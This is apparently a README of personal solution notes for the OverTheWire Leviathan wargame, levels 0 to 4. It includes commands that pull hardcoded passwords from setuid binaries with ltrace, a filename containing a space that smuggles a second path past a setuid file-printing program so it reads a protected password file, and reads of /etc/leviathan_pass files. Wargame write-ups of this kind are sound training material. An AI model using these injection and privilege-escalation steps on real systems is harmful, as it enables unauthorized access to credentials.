# Leviathan

Visit the [website][1].

Server details:
```
url:   leviathan.labs.overthewire.org
port:  2223
user:  leviathan<level>
```

For convenience use
```bash
./connect.sh <level>
```

### Storing solutions

Once you have a password add it to a `passwords` file in the form `<level> <password`. When you run the `./connect.sh`
script it will print the password for the level if it exists so you can easily copy and paste it.  
For example
```
0 leviathan0
1 1234567890abcdef
2 fedcba0987654321
```

In the case where you get the private key for a level store it in a file named `leviathan<level>_key` e.g. if you have found
the key for `leviathan24` store it in the file `leviathan24_key`. This key will be used automatically when running the
`./connect.sh` script for that level (e.g. `./connect.sh 24`).

The starting password for level `0` is `leviathan0`.

### Levels

There are no instructions for any levels though pages do exist for them
```
https://overthewire.org/wargames/leviathan/leviathan<level>.html
```

##### 0

`grep password ./backups/bookmarks.html`

##### 1

```bash
# we have a setuid check program locally
# check what's being called when check runs
ltrace ./check
# it wants a password which it does a strcmp against so we can just use the string it's comparing against then
# it opens a new shell and we can
cat /etc/leviathan_pass/leviathan_2
```

##### 2

We have a `printfile` executable which is `setuid`. If we try something like `ltrace ./printfile .profile` we see
that we first check if the file is readable before passing it to `cat` like `cat %s`. We can take advantage of the
filename being passed in as is and the fact that it won't correctly intpret strings in the filename!

```bash
mkdir /tmp/andrewflbarnes2
cd /tmp/andrewflbarnes2

touch test
mkdir -p 'test /etc/leviathan_pass/'
touch 'test /etc/leviathan_pass/leviathan2'

~/printfile 'test /etc/leviathan_pass/leviathan2'
```

When we run the final comman the `printfile` program checks if the full string is a readable file - it treats
"`test `" as a directory rather than a file followed by a space.

However when it is passed to the cat command it treats the space as if it is separating two files - so we end
up catting the local `test` file and the actual file we want - `/etc/leviathan_pass/leviathan3` :)

##### 3

Same as level 1 - just run the `setuid` program `level4` with `ltrace` and check what password it wants. Rerun and
provide the password which gives a shell and then cat the password file.
```bash
ltrace ./level3
# find out the password
./level3
# enter the password
id
cat /etc/leviathan_pass/leviathan4
```

##### 4

Nigthmare... seems like there's no easy way to go from bits -> ascii on linux?

.trash/bin outputs the required password in binary (grouped by 8 bits).

```bash
for i in $(./.trash/bin)
do
    echo -ne $(printf "\\x%x\n" $((2#$i)) 2>/dev/null)
done
```

[1]: <https://overthewire.org/wargames/leviathan/> "Leviathan wargames landing page"
